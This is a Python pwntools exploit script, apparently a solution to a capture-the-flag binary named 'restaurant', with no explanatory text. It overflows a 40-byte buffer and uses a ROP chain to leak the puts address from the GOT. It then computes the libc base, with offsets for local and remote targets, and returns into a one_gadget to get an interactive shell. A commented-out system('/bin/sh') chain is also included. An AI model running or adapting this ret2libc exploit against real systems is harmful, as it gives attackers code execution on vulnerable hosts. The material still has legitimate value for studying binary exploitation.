#!/usr/bin/python3
import sys

from pwn import *
import json


elf = context.binary = ELF('restaurant')


def start():

    file_name = './restaurant'

    if len(sys.argv) > 1:
        if sys.argv[1] == 'gdb':
            return gdb.debug(file_name, gdbscript='continue')
        else:
            host, port = sys.argv[2:]
            return remote(host, port)
    return process(file_name)


def main():

    io = start()
    io.sendlineafter('>', '1')

    payload = b'a' * 40

    pop_rdi = p64(0x4010a3)
    puts_got = p64(elf.symbols.got.puts)
    puts_plt = p64(elf.symbols.plt.puts)
    main_func = p64(elf.symbols.main)
    color = p64(0x00400eb7)
    redirect_addr = p64(0x00400eb7)

    payload += pop_rdi + puts_got + puts_plt + main_func

    io.sendlineafter('>', payload)

    io.recvuntil('Enjoy your aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')

    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        puts_offset = 0x080aa0
        system_offset = 0x04f550
        bin_sh_offset = 0x1b582c
    else:
        puts_offset = 0x765f0
        system_offset = 0x48e50
        bin_sh_offset = 0x18a152

    leaked_address = u64(io.recvline().strip()[-6:].ljust(8, b'\x00'))

    libc_base = leaked_address - puts_offset

    system_addr = libc_base + system_offset
    bin_sh = libc_base + bin_sh_offset

    info(f'leaked address: {hex(leaked_address)}')
    
    one_gadget = libc_base + 0x4f432
    payload = b'a'* 40 + p64(one_gadget)

    # payload = b'a' * 40 + pop_rdi + p64(bin_sh) + p64(system_addr)

    io.sendlineafter('>', '1')
    io.sendlineafter('>', payload)

    io.interactive()


if __name__ == '__main__':
    main()
